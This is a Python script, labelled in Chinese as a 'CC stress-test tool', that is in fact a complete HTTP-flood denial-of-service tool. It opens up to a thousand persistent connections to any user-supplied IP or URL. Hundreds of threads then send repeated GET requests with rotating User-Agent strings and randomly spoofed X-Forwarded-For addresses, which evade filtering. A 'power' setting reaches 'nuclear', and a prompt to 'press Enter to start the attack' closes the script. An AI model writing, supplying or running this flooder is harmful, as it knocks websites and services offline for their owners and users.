import socket,sys,time
import threading as th
from random import choice,randint
from tqdm import tqdm
m,version='beta','0.0.1a'
useragents=[
    'Java/21.0.3',
    'Python-urllib/2.5',
    'Wget/1.9 cvs-stable (Red Hat modified)',
    'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36 Edg/137.0.0.0',
    'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
    'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
    'Baiduspider ( http://www.baidu.com/search/spider.htm)',
    'CSSCheck/1.2.2',
    'HTMLParser/1.6',
    'libwww-perl/5.820',
    'Mozilla/3.01Gold (Win95; I)',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
    'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
    'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
    'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
    'SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0'
]
accepts=[
    'Accept: */*\r\n',
    'Accept-Encoding: gzip, deflate, br, zstd\r\n',
    'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\r\n',
    'Accept-Language: en-US,en;q=0.5\r\n'
]
lock,lock1=th.RLock(),th.RLock()
clients=[]
cindex=0
def getln(txt,typ=str,n=None,ls=[],err='输入不正确,请重新输入!'):
    while True:
        tmp=input(txt)
        if not tmp and n:
            return n
        if not tmp in ls and ls!=[]:
            print(err)
            continue
        try:tmp=typ(tmp);break
        except:print(err)
    return tmp
def print(*args,end='\n'):
    sys.stdout.write(' '.join(map(str,[*args]))+end)
def log(*args,mode='INFO',end='\n',start=''):
    txt=' '.join([*args])
    t=time.strftime('%H:%M:%S',time.localtime(time.time()))
    print(f'{start}[{t} {mode}]: {txt}',end=end)
class mht_default(th.Thread):
    def __init__(self):
        th.Thread.__init__(self)
    def run(self):
        global clients,cindex
        c=th.current_thread().name
        useragent='User-Agent: '+choice(useragents)+'\r\n'
        accept=choice(accepts)
        ipr=f'{randint(0,255)}.{randint(0,255)}.{randint(0,255)}.{randint(0,255)}'
        forward='X-Forwarded-For: '+ipr+'\r\n'
        connection='Connection: Keep-Alive\r\n'
        get_host='GET'+' '+page+' HTTP/1.1\r\nHost: '+ip+'\r\n'
        req=get_host+useragent+accept+forward+connection+'\r\n'
        req=bytes(req,encoding='gbk')
        while 1:
            lock.acquire()
            if cindex>=cn:cindex=0
            tmpa=cindex
            client=clients[cindex]
            cindex+=1
            lock.release()
            try:
                log(f'[+] SEND PACKET @ {c}')
                try:
                    for tmp in range(cnt):
                        client.send(req)
                except:
                    clients.append(create_client())
                    del clients[tmpa]
            except Exception as ad:
                log(f'[-] @ {c} ',str(ad),mode='ERROR')
                clients.append(create_client())
                del clients[tmpa]
def create_client():
    while 1:
        try:
            temp_client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #端口复用,防止报错
            temp_client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            temp_client.connect((ip,port))
            return temp_client
        except:pass
def sclient():
    global cntmp,cntmp1
    while cntmp:
        try:cntmp.pop(0)
        except:return
        clients.append(create_client())
        cbar.update(1)
        cntmp1+=1
log('Mh_Test',m,version)
log('Mh cc压力测试工具')
ip=getln('IP/网址:').replace('http://','').replace('https://','')
page=ip.split('/')
page='/' if len(page)==1 else '/'+'/'.join(page[1:])
port=getln('PORT/端口:',int)
cn=getln('CONNECT/连接数(1000):',int,1000)
thread=getln('THREAD/发包线程(500):',int,500)
cnt=getln('威力[(10=普通)(50=高)(100=核爆)]:',int,100)
log('创建连接')
cntmp=list(range(cn))
cntmp1=0
cbar=tqdm(total=cn)
if thread>cn:thread=cn
for i in range(thread):
    try:tth=th.Thread(target=sclient,name='create').start()
    except:pass
while cntmp1<cn:
    time.sleep(1)
cbar.close()
log(f'创建了{len(clients)}条连接')
lock.acquire()
log('启动线程')
for i in range(thread):
    try:tth=mht_default().start()
    except:pass
log('加载完毕')
input('按下Enter开始攻击')
lock.release()
